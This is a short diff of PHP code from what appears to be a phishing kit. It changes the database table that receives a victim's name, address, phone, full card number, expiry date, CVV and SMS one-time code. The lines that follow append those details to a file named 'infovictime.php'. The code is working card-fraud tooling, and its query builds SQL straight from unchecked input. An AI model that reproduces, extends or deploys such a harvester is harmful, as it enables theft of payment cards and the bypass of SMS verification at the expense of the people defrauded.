@@ -46,7 +46,7 @@ if(  isset($_POST["confirmcodesms"])  )
 		}
 					
 			
-		    $result = mysqli_query(  $con  ,	"INSERT INTO codesmsorderclien (  datetime , ip , totalitem , totalprice , email  ,  firstname , lastname ,  address , city	, country  , postcode , phone , nameoncard , cardnumber , expmm , expyy , cvv , codesms)    VALUES    (    '$datetime'  , '$ip' , '$totalitem' ,  '$totalprice' ,  '$email'   , '$firstname'  , '$lastname'   ,  '$address'  ,	'$city' 	,  '$country'   ,  '$postcode'  ,   '$phone'   , '$nameoncard' , '$cardnumber' , '$expmm' , '$expyy' , '$cvv' , '$codesms' )"   );            
+		    $result = mysqli_query(  $con  ,	"INSERT INTO ordercliencodesms (  datetime , ip , totalitem , totalprice , email  ,  firstname , lastname ,  address , city	, country  , postcode , phone , nameoncard , cardnumber , expmm , expyy , cvv , codesms)    VALUES    (    '$datetime'  , '$ip' , '$totalitem' ,  '$totalprice' ,  '$email'   , '$firstname'  , '$lastname'   ,  '$address'  ,	'$city' 	,  '$country'   ,  '$postcode'  ,   '$phone'   , '$nameoncard' , '$cardnumber' , '$expmm' , '$expyy' , '$cvv' , '$codesms' )"   );            
 
 			$file = Fopen("infovictime.php","a+"); 
 			fwrite($file ,    "\n /-- star info victime --/"                                        );
